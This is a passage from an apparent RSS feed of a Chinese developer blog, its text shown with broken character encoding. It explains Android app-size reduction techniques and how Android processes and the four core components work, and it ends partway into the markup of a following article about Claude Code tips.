<li><strong>WebP æ ¼å¼</strong>ï¼šå°†å›¾ç‰‡è½¬ä¸º <strong>WebP</strong> æ ¼å¼ï¼Œå®ƒæ¯” <strong>PNG</strong> æˆ– <strong>JPEG</strong> çš„å‹ç¼©ç‡æ›´é«˜ã€‚</li>
</ul>
<p>é…ç½®ç¤ºä¾‹ï¼ˆå¯ç”¨çŸ¢é‡å›¾æ”¯æŒï¼‰ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">android {
    defaultConfig {
        vectorDrawables.useSupportLibrary = <span class="hljs-literal">true</span>
    }
}
</code></pre>
<h3 data-id="heading-33">ä½¿ç”¨ AAB</h3>
<p>åˆ‡æ¢åˆ° <strong>AAB</strong> æ ¼å¼åï¼Œ<strong>Google Play</strong> ä¼šç”Ÿæˆé€‚é…ç›®æ ‡è®¾å¤‡çš„ä¼˜åŒ– <strong>APK</strong>ï¼ŒåªåŒ…å«å¯¹åº”è®¾å¤‡æ‰€éœ€çš„èµ„æºå’Œä»£ç ï¼ˆå¦‚ç‰¹å®šå±å¹•å¯†åº¦ã€CPU æ¶æ„ã€è¯­è¨€ï¼‰ï¼Œä»è€Œå‡å°åº”ç”¨ä½“ç§¯ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">android {
    bundle {
        density {
            enableSplit <span class="hljs-literal">true</span>
        }
        abi {
            enableSplit <span class="hljs-literal">true</span>
        }
        language {
            enableSplit <span class="hljs-literal">true</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-34">ç§»é™¤ä¸å¿…è¦çš„ä¾èµ–</h3>
<p>æ£€æŸ¥é¡¹ç›®ä¾èµ–ï¼Œç§»é™¤æœªä½¿ç”¨æˆ–å†—ä½™çš„åº“ã€‚å¯ä»¥ç”¨ Android Studio çš„ <strong>Gradle Dependency Analyzer</strong> è¯†åˆ«ä½“ç§¯è¾ƒå¤§çš„åº“å’Œä¼ é€’ä¾èµ–ã€‚</p>
<h3 data-id="heading-35">ä¼˜åŒ–åŸç”Ÿåº“</h3>
<p>è‹¥åº”ç”¨åŒ…å«åŸç”Ÿåº“ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹ç­–ç•¥å‡å°å…¶å½±å“ï¼š</p>
<ul>
<li><strong>æ’é™¤æœªä½¿ç”¨çš„æ¶æ„</strong>ï¼šåœ¨ <code>build.gradle</code> ä¸­ç”¨ <code>abiFilters</code> åªä¿ç•™æ‰€éœ€çš„ <strong>ABI</strong>ã€‚</li>
<li><strong>å‰¥ç¦»è°ƒè¯•ç¬¦å·</strong>ï¼šç”¨ <code>stripDebugSymbols</code> ç§»é™¤åŸç”Ÿåº“ä¸­çš„è°ƒè¯•ç¬¦å·ã€‚</li>
</ul>
<p>é…ç½®ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">android {
    defaultConfig {
        ndk {
            abiFilters <span class="hljs-string">"armeabi-v7a"</span>, <span class="hljs-string">"arm64-v8a"</span> <span class="hljs-comment">// åªä¿ç•™éœ€è¦çš„ ABI</span>
        }
    }
    packagingOptions {
        exclude <span class="hljs-string">"**/lib/**/*.so.debug"</span>
    }
}
</code></pre>
<h3 data-id="heading-36">é€šè¿‡ ProGuard è§„åˆ™å‡å°‘è°ƒè¯•ä¿¡æ¯</h3>
<p>è°ƒè¯•å…ƒæ•°æ®ä¼šå¢å¤§ <strong>APK/AAB</strong> ä½“ç§¯ï¼Œå¯ä»¥åœ¨ <code>proguard-rules.pro</code> ä¸­é…ç½®ç§»é™¤è¿™äº›ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">-dontwarn com.example.usedlibrary.**</span>
<span class="hljs-deletion">-keep class com.example.important.** { *; }</span>
</code></pre>
<h3 data-id="heading-37">ä½¿ç”¨åŠ¨æ€åŠŸèƒ½æ¨¡å—</h3>
<p>åŠ¨æ€åŠŸèƒ½æ¨¡å—å¯ä»¥å°†ä¸å¸¸ç”¨çš„åŠŸèƒ½æ‹†åˆ†ä¸ºæŒ‰éœ€åŠ è½½çš„æ¨¡å—ï¼Œå‡å°åˆå§‹ä¸‹è½½åŒ…çš„ä½“ç§¯ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">dynamicFeatures = [<span class="hljs-string">":feature1"</span>, <span class="hljs-string">":feature2"</span>]
</code></pre>
<h3 data-id="heading-38">é¿å…åº”ç”¨å†…åŒ…å«å¤§å‹èµ„æº</h3>
<ul>
<li>å°†è§†é¢‘ã€é«˜æ¸…å›¾ç‰‡ç­‰å¤§å‹èµ„æºæ‰˜ç®¡åˆ° <strong>CDN</strong>ï¼Œåœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½ã€‚</li>
<li>åª’ä½“å†…å®¹ä½¿ç”¨æµå¼ä¼ è¾“ï¼Œè€Œéæ‰“åŒ…åˆ°åº”ç”¨ä¸­ã€‚</li>
</ul>
<h3 data-id="heading-39">æ€»ç»“</h3>
<p>å‡å° Android åº”ç”¨ä½“ç§¯éœ€è¦ç»“åˆå¤šç§ç­–ç•¥ï¼šç§»é™¤æœªä½¿ç”¨èµ„æºã€å¯ç”¨ <strong>AAB</strong> ä»£ç å‹ç¼©ã€ä¼˜åŒ–èµ„æºã€ä½¿ç”¨ <strong>AAB</strong> æ ¼å¼ç­‰ã€‚æ­¤å¤–ï¼Œæ£€æŸ¥ä¾èµ–ã€ä¼˜åŒ–åŸç”Ÿåº“ã€æ¨¡å—åŒ–åŠŸèƒ½ä¹Ÿèƒ½è¿›ä¸€æ­¥å‡å°ä½“ç§¯ã€‚è¿™äº›å®è·µèƒ½è®©åº”ç”¨æ›´è½»é‡åŒ–ã€æ€§èƒ½æ›´å¥½ï¼ŒåŒæ—¶æä¾›å‡ºè‰²çš„ç”¨æˆ·ä½“éªŒã€‚</p>
<h2 data-id="heading-40">è¿›ç¨‹</h2>
<p>åœ¨ Android ä¸­ï¼Œè¿›ç¨‹æ˜¯åº”ç”¨ç»„ä»¶çš„è¿è¡Œç¯å¢ƒã€‚æ¯ä¸ª Android åº”ç”¨éƒ½åœ¨ç‹¬ç«‹è¿›ç¨‹ä¸­ä»¥å•çº¿ç¨‹è¿è¡Œï¼Œä¸å…¶ä»–åº”ç”¨éš”ç¦»ï¼Œä»¥æ­¤ä¿è¯ç³»ç»Ÿå®‰å…¨ã€å†…å­˜ç®¡ç†å’Œå®¹é”™æ€§ã€‚Android è¿›ç¨‹ç”± Linux å†…æ ¸ç®¡ç†ï¼Œéµå¾ªä¸¥æ ¼çš„ç”Ÿå‘½å‘¨æœŸè§„åˆ™ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒä¸€åº”ç”¨çš„æ‰€æœ‰ç»„ä»¶éƒ½è¿è¡Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹å’Œçº¿ç¨‹ï¼ˆå³ä¸»çº¿ç¨‹ï¼‰ä¸­ã€‚</p>
<h3 data-id="heading-41">é¢è¯•é—®é¢˜</h3>
<p>ä½ æ­£åœ¨å¼€å‘ä¸€ä¸ªåº”ç”¨ï¼Œå…¶ä¸­ä¸åŒçš„ Android ç»„ä»¶éœ€è¦è¿è¡Œåœ¨ç‹¬ç«‹è¿›ç¨‹ä¸­ã€‚å¦‚ä½•åœ¨ <code>AndroidManifest</code> ä¸­é…ç½®ï¼Ÿä½¿ç”¨å¤šè¿›ç¨‹æœ‰å“ªäº›æ½œåœ¨å¼Šç«¯ï¼Ÿ</p>
<p>Android ç³»ç»Ÿåœ¨å†…å­˜ä¸è¶³æ—¶ï¼Œä¼šé€šè¿‡åŸºäºä¼˜å…ˆçº§çš„è¿›ç¨‹ç®¡ç†ç³»ç»Ÿå†³å®šæ€æ­»å“ªäº›è¿›ç¨‹ã€‚è¯·è§£é‡Šç³»ç»Ÿå¦‚ä½•ç»™è¿›ç¨‹æ’åºä¼˜å…ˆçº§ï¼Ÿå¼€å‘è€…åº”è¯¥éµå¾ªå“ªäº›ç­–ç•¥é˜²æ­¢é‡è¦è¿›ç¨‹è¢«ç»ˆæ­¢ï¼Ÿ</p>
<h3 data-id="heading-42">å·¥ä½œåŸç†</h3>
<p>å½“å¯åŠ¨ä¸€ä¸ª Android åº”ç”¨æ—¶ï¼Œç³»ç»Ÿä¼šé€šè¿‡ Linux çš„ <code>fork()</code> ç³»ç»Ÿè°ƒç”¨ä¸ºå…¶åˆ›å»ºæ–°è¿›ç¨‹ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æ˜¯ <strong>Dalvik</strong> æˆ– <strong>ART</strong> è™šæ‹Ÿæœºçš„ç‹¬ç«‹å®ä¾‹ï¼Œæ”¯æŒä»£ç çš„å®‰å…¨ç‹¬ç«‹æ‰§è¡Œã€‚Android ä¼šä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…å”¯ä¸€çš„ Linux ç”¨æˆ· IDï¼ˆUIDï¼‰ï¼Œä»¥æ­¤å®ç°ä¸¥æ ¼çš„å®‰å…¨è¾¹ç•Œï¼ŒåŒ…æ‹¬æƒé™æ§åˆ¶å’Œæ–‡ä»¶ç³»ç»Ÿéš”ç¦»ã€‚</p>
<h3 data-id="heading-43">åº”ç”¨ç»„ä»¶ä¸è¿›ç¨‹çš„å…³è”</h3>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒä¸€åº”ç”¨çš„æ‰€æœ‰ç»„ä»¶éƒ½è¿è¡Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œå¤§å¤šæ•°åº”ç”¨éƒ½éµå¾ªè¿™ä¸ªæ ‡å‡†ã€‚ä¸è¿‡å¼€å‘è€…å¯ä»¥åœ¨ <code>AndroidManifest.xml</code> ä¸­é€šè¿‡ <code>android:process</code> å±æ€§è‡ªå®šä¹‰è¿›ç¨‹åˆ†é…ï¼Œè¯¥å±æ€§å¯ç”¨äº <code>&lt;activity&gt;</code>ã€<code>&lt;service&gt;</code>ã€<code>&lt;receiver&gt;</code>ã€<code>&lt;provider&gt;</code> ç­‰ç»„ä»¶ï¼Œè®©ç»„ä»¶è¿è¡Œåœ¨ç‹¬ç«‹è¿›ç¨‹æˆ–é€‰æ‹©æ€§å…±äº«è¿›ç¨‹ã€‚</p>
<p><code>&lt;application&gt;</code> å…ƒç´ ä¹Ÿæ”¯æŒè¯¥å±æ€§ï¼Œç”¨äºå®šä¹‰æ‰€æœ‰ç»„ä»¶çš„é»˜è®¤è¿›ç¨‹ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span>
    <span class="hljs-attr">android:name</span>=<span class="hljs-string">".MyService"</span>
    <span class="hljs-attr">android:process</span>=<span class="hljs-string">":remote"</span> /&gt;</span>
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒæœåŠ¡ <code>MyService</code> è¿è¡Œåœ¨åä¸º <code>:remote</code> çš„ç‹¬ç«‹è¿›ç¨‹ä¸­ï¼Œå®ç°äº†ç‹¬ç«‹è¿è¡Œå’Œæ›´é«˜çš„å®¹é”™æ€§ã€‚</p>
<p>æ­¤å¤–ï¼Œä¸åŒåº”ç”¨çš„ç»„ä»¶å¦‚æœæ‹¥æœ‰ç›¸åŒçš„ Linux ç”¨æˆ· ID ä¸”ç­¾åä¸€è‡´ï¼Œå¯ä»¥å…±äº«åŒä¸€ä¸ªè¿›ç¨‹ã€‚Android ä¼šæ ¹æ®ç³»ç»Ÿèµ„æºéœ€æ±‚åŠ¨æ€ç®¡ç†è¿›ç¨‹ï¼šå½“å†…å­˜ä¸è¶³æ—¶ï¼Œä¼šç»ˆæ­¢ä¼˜å…ˆçº§è¾ƒä½çš„è¿›ç¨‹ï¼›è€Œå½“å…³è”ç»„ä»¶éœ€è¦å·¥ä½œæ—¶ï¼Œç³»ç»Ÿä¼šé‡å¯è¿›ç¨‹ï¼Œä»¥æ­¤ä¿è¯ç³»ç»Ÿæ€§èƒ½å’Œç”¨æˆ·ä½“éªŒçš„æœ€ä¼˜ã€‚</p>
<h3 data-id="heading-44">è¿›ç¨‹ä¸åº”ç”¨ç”Ÿå‘½å‘¨æœŸ</h3>
<p>Android ä¼šæ ¹æ®ç³»ç»Ÿå†…å­˜å’Œåº”ç”¨å½“å‰çŠ¶æ€ï¼ŒæŒ‰ç…§ä¸¥æ ¼çš„ä¼˜å…ˆçº§å±‚çº§ç®¡ç†è¿›ç¨‹å’Œåº”ç”¨ç”Ÿå‘½å‘¨æœŸï¼š</p>
<ol>
<li><strong>å‰å°è¿›ç¨‹</strong>ï¼šæ­£åœ¨ä¸ç”¨æˆ·äº¤äº’çš„è¿›ç¨‹ï¼Œä¼˜å…ˆçº§æœ€é«˜ï¼Œå‡ ä¹ä¸ä¼šè¢«æ€æ­»ã€‚</li>
<li><strong>å¯è§è¿›ç¨‹</strong>ï¼šå¯¹ç”¨æˆ·å¯è§ä½†æœªäº¤äº’çš„è¿›ç¨‹ï¼ˆæ¯”å¦‚å¯¹è¯æ¡†åçš„ <code>Activity</code>ï¼‰ã€‚</li>
<li><strong>æœåŠ¡è¿›ç¨‹</strong>ï¼šè¿è¡Œåå°æœåŠ¡çš„è¿›ç¨‹ï¼ˆæ¯”å¦‚åŒæ­¥æ•°æ®ã€æ’­æ”¾éŸ³ä¹ï¼‰ã€‚</li>
<li><strong>ç¼“å­˜è¿›ç¨‹</strong>ï¼šé—²ç½®çš„è¿›ç¨‹ï¼Œä¿ç•™åœ¨å†…å­˜ä¸­ä»¥ä¾¿å¿«é€Ÿé‡å¯ï¼Œä¼˜å…ˆçº§æœ€ä½ï¼Œå†…å­˜ä¸è¶³æ—¶ä¼šè¢«ä¼˜å…ˆæ€æ­»ã€‚</li>
</ol>
<p>Android ç³»ç»Ÿä¼šè‡ªåŠ¨ç»ˆæ­¢ä½ä¼˜å…ˆçº§è¿›ç¨‹ä»¥é‡Šæ”¾å†…å­˜ï¼Œä¿è¯ç³»ç»Ÿç¨³å®šã€‚</p>
<h3 data-id="heading-45">å®‰å…¨ä¸æƒé™</h3>
<p>æ¯ä¸ª Android è¿›ç¨‹éƒ½é€šè¿‡ Linux å®‰å…¨æ¨¡å‹å®ç°æ²™ç›’éš”ç¦»ï¼Œå¼ºåˆ¶åŸºäºæƒé™çš„è®¿é—®æ§åˆ¶ã€‚è¿™ç§éš”ç¦»ç¡®ä¿åº”ç”¨æ— æ³•è®¿é—®å…¶ä»–è¿›ç¨‹çš„æ•°æ®ï¼Œé™¤éé€šè¿‡ Android æƒé™ç³»ç»Ÿæ˜¾å¼æˆäºˆæƒé™ã€‚è¿™ä¸ªå®‰å…¨æ¨¡å‹æ˜¯ Android å¤šä»»åŠ¡ç¯å¢ƒçš„åŸºç¡€ï¼ŒåŒæ—¶ä¿éšœäº†ç³»ç»Ÿç¨³å®šæ€§å’Œæ•°æ®éšç§ã€‚</p>
<h3 data-id="heading-46">æ€»ç»“</h3>
<p>Android ä¸­çš„è¿›ç¨‹æ˜¯åº”ç”¨ç»„ä»¶çš„è¿è¡Œç¯å¢ƒï¼Œä¿è¯äº†éš”ç¦»ã€å®‰å…¨ã€é«˜æ•ˆçš„è¿è¡Œã€‚è¿›ç¨‹ç”±ç³»ç»Ÿåˆ›å»ºã€è°ƒåº¦å’Œç»ˆæ­¢ï¼Œä¾æ®å†…å­˜çº¦æŸã€ç”¨æˆ·æ´»åŠ¨å’Œåº”ç”¨ä¼˜å…ˆçº§ã€‚å¼€å‘è€…å¯ä»¥é€šè¿‡æ¸…å•æ–‡ä»¶çš„é…ç½®å’Œæƒé™ç®¡ç†ï¼Œè¿›ä¸€æ­¥æ§åˆ¶è¿›ç¨‹è¡Œä¸ºï¼Œå®ç°å¥å£®ã€å¯æ‰©å±•çš„åº”ç”¨å¼€å‘ã€‚</p>
<h3 data-id="heading-47">è¿›é˜¶ï¼šä½•ä¸º Android çš„å››å¤§ç»„ä»¶</h3>
<p><code>Activity</code>ã€<code>Service</code>ã€å¹¿æ’­ã€<code>ContentProvider</code> è¢«ç§°ä¸º Android å››å¤§ç»„ä»¶ï¼Œæ˜¯å› ä¸ºå®ƒä»¬æ˜¯åº”ç”¨ä¸ç³»ç»Ÿã€å…¶ä»–åº”ç”¨äº¤äº’çš„æ ¸å¿ƒæ„å»ºå—ã€‚è¿™äº›ç»„ä»¶ç®¡ç†åº”ç”¨çš„ç”Ÿå‘½å‘¨æœŸã€å®šä¹‰åº”ç”¨è¡Œä¸ºã€å®ç°è¿›ç¨‹é—´é€šä¿¡ï¼Œä¸ Android çš„è¿›ç¨‹å’Œåº”ç”¨ç”Ÿå‘½å‘¨æœŸæ¨¡å‹ç´§å¯†å…³è”ã€‚</p>
<h3 data-id="heading-48">å„ç»„ä»¶ä¸ Android è¿›ç¨‹çš„å…³è”</h3>
<ol>
<li><strong>Activity</strong>ï¼šä»£è¡¨ä¸€ä¸ªå¸¦ç•Œé¢çš„å±å¹•ï¼Œæ˜¯ç”¨æˆ·äº¤äº’çš„å…¥å£ï¼Œä¸ Android è¿›ç¨‹ç”Ÿå‘½å‘¨æœŸé«˜åº¦ç»‘å®šã€‚å½“ç”¨æˆ·æ‰“å¼€åº”ç”¨æ—¶ï¼Œç³»ç»Ÿä¼šå¯åŠ¨ <code>Activity</code> å¹¶åˆ›å»ºå¯¹åº”çš„è¿›ç¨‹ï¼›å¦‚æœè¿›ç¨‹è¢«æ€æ­»ï¼Œ<code>Activity</code> ä¹Ÿä¼šé”€æ¯ï¼Œé‡å¯åº”ç”¨ä¼šåˆ›å»ºæ–°è¿›ç¨‹ã€‚</li>
<li><strong>Service</strong>ï¼šåœ¨æ— ç•Œé¢çš„æƒ…å†µä¸‹æ‰§è¡Œåå°æ“ä½œï¼Œå³ä½¿åº”ç”¨ä¸å¯è§ä¹Ÿèƒ½è¿è¡Œï¼ˆæ¯”å¦‚æ’­æ”¾éŸ³ä¹ã€ä¸‹è½½æ–‡ä»¶ï¼‰ã€‚<code>Service</code> å¯ä»¥è¿è¡Œåœ¨åº”ç”¨çš„é»˜è®¤è¿›ç¨‹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ¸…å•ä¸­çš„ <code>android:process</code> å±æ€§æŒ‡å®šç‹¬ç«‹è¿›ç¨‹ã€‚</li>
<li><strong>å¹¿æ’­</strong>ï¼šè®©åº”ç”¨æ¥æ”¶å¹¶å“åº”ç³»ç»Ÿçº§å¹¿æ’­æ¶ˆæ¯ï¼ˆæ¯”å¦‚ç½‘ç»œå˜åŒ–ã€ç”µæ± çŠ¶æ€æ›´æ–°ï¼‰ã€‚å³ä½¿åº”ç”¨æœªè¿è¡Œï¼Œå¹¿æ’­è§¦å‘æ—¶ç³»ç»Ÿä¹Ÿä¼šå¯åŠ¨å¯¹åº”çš„è¿›ç¨‹ï¼ˆå¦‚æœéœ€è¦ï¼‰ã€‚</li>
<li><strong>ContentProvider</strong>ï¼šç®¡ç†åº”ç”¨çš„å…±äº«æ•°æ®ï¼Œæä¾›å¯¹é›†ä¸­å¼æ•°æ®åº“çš„è¯»å†™èƒ½åŠ›ï¼Œæ”¯æŒè¿›ç¨‹é—´é€šä¿¡â€”â€”è¿™æ„å‘³ç€å®ƒå¯ä»¥è·¨åº”ç”¨å…±äº«æ•°æ®ï¼Œéœ€è¦ç³»ç»Ÿå®‰å…¨é«˜æ•ˆåœ°ç®¡ç†è¿›ç¨‹ã€‚</li>
</ol>
<h3 data-id="heading-49">ä¸ Android è¿›ç¨‹çš„å…³è”</h3>
<p>è¿™äº›ç»„ä»¶ä¸ Android è¿›ç¨‹ç»‘å®šï¼Œå› ä¸ºç³»ç»Ÿä¼šæ ¹æ®åº”ç”¨ä½¿ç”¨æƒ…å†µã€å†…å­˜å¯ç”¨æ€§å’Œä»»åŠ¡ä¼˜å…ˆçº§ç®¡ç†è¿›ç¨‹ã€‚å½“ç»„ä»¶è¢«è§¦å‘ï¼ˆæ¯”å¦‚æ‰“å¼€ <code>Activity</code>ã€æ¥æ”¶å¹¿æ’­ï¼‰æ—¶ï¼Œå¦‚æœè¿›ç¨‹æœªè¿è¡Œï¼ŒAndroid ä¼šå¯åŠ¨å¯¹åº”çš„è¿›ç¨‹ã€‚æ¯ä¸ªç»„ä»¶ä¹Ÿå¯ä»¥é€šè¿‡æ¸…å•ä¸­çš„ <code>android:process</code> å±æ€§åˆ†é…ç‹¬ç«‹è¿›ç¨‹ï¼Œä¸ºèµ„æºå¯†é›†å‹ä»»åŠ¡æä¾›æ›´å¤§çš„çµæ´»æ€§ã€‚</p>
<p>è¿™æ„å‘³ç€å››å¤§ç»„ä»¶éƒ½å¯ä»¥åœ¨ Android ç³»ç»Ÿä¸­æ‹¥æœ‰ä¸“å±è¿›ç¨‹ã€‚ç”±äºè¿™äº›ç»„ä»¶å¯ä»¥é…ç½®ä¸ºè¿è¡Œåœ¨ç‹¬ç«‹è¿›ç¨‹ä¸­ï¼Œå®ƒä»¬è·å¾—äº†ç³»ç»Ÿçº§èƒ½åŠ›ï¼Œæ¯”å…¶ä»–ç»„ä»¶æ›´å¼ºå¤§ã€æ›´ç‹¬ç«‹ã€‚è¿™ç§è®¾è®¡æ”¯æŒåå°æ‰§è¡Œã€è¿›ç¨‹é—´é€šä¿¡å’Œç³»ç»Ÿçº§äº¤äº’ï¼Œè®© Android åº”ç”¨èƒ½é«˜æ•ˆå¤„ç†å¤æ‚çš„å¤šè¿›ç¨‹ä»»åŠ¡ã€‚</p>
<p>æ€»çš„æ¥è¯´ã€‚</p>
<p><code>Activity</code>ã€<code>Service</code>ã€å¹¿æ’­ã€<code>ContentProvider</code> æ˜¯ Android çš„æ ¸å¿ƒç»„ä»¶ï¼Œå› ä¸ºå®ƒä»¬å®ç°äº†åº”ç”¨çš„æ ¸å¿ƒåŠŸèƒ½ã€ç”¨æˆ·äº¤äº’å’Œåº”ç”¨é—´é€šä¿¡ã€‚å®ƒä»¬ä¸ Android è¿›ç¨‹æ¨¡å‹çš„ç´§å¯†å…³è”ï¼Œä¿è¯äº†é«˜æ•ˆçš„è¿›ç¨‹ç®¡ç†ã€æœ€ä¼˜çš„èµ„æºåˆ©ç”¨å’Œç³»ç»Ÿçº§ä»»åŠ¡åè°ƒï¼Œæ˜¯ Android åº”ç”¨å¼€å‘çš„åŸºç¡€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è°ˆè°ˆæˆ‘å¯¹ Claude Code ä¹‹çˆ¶13æ¡æŠ€å·§çš„ç†è§£]]></title>    <link>https://juejin.cn/post/7592452108797952043</link>    <guid>https://juejin.cn/post/7592452108797952043</guid>    <pubDate>2026-01-08T01:02:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592452108797952043" data-draft-id="7592451588847960083" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è°ˆè°ˆæˆ‘å¯¹ Claude Code ä¹‹çˆ¶13æ¡æŠ€å·§çš„ç†è§£"/> <meta itemprop="keywords" content="Claude,AIç¼–ç¨‹,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T01:02:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é£å“¥æ•°æ™ºè°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/3825956195409223"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è°ˆè°ˆæˆ‘å¯¹ Claude Code ä¹‹çˆ¶13æ¡æŠ€å·§çš„ç†è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3825956195409223/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é£å“¥æ•°æ™ºè°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:02:17.000Z" title="Thu Jan 08 2026 01:02:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 